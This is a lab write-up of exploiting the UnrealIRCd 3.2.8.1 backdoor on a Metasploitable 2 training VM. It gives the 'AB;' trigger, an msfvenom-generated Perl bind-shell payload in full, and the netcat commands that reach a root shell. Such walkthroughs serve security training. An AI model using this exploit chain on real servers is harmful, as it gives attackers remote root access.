UnrealIRCD 3.2.8.1 Backdoor Command Execution
**Attacker:** Kali Linux<br>
**Victim:** Metasploitable 2<br>
<br>
Unreal IRCD 3.2.8.1 contains a backdoor that is triggered by entering **AB;** upon connecting. The backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.<br>
<br>
The following example demonstrates it’s use on Metasploitable 2 (192.168.1.142).<br>
##Generating the Payload
We’re going to generate a unix bind shell with msfvenom (port 4444) and connect to this with Netcat.
<code>
<div class="code">
root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl --payload-options</com><br>
root@kali:~$ <com>msfvenom -p cmd/unix/bind_perl LHOST=192.168.1.142</com><br>
No platform was selected, choosing Msf::Module::Platform::Unix from the payload<br>
No Arch selected, selecting Arch: cmd from the payload<br>
No encoder or badchars specified, outputting raw payload<br>
Payload size: 240 bytes<br>
<b>perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</b><br>
</div>
</code>
##Triggering the Exploit
<code>
<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 6667</com><br>
(UNKNOWN) [192.168.1.142] 6667 (ircd) open<br>
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...<br>
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead<br>
<com>AB;perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(){if($_=~ /(.*)/){system $1;}};'</com><br>
:irc.Metasploitable.LAN 451 AB;perl :You have not registered
</div>
</code>
##Connecting to the Netcat Bind Shell
<code>
<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 4444</com><br>
(UNKNOWN) [192.168.1.142] 4444 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/etc/unreal#
</div>
</code>

Tags: backdoors 
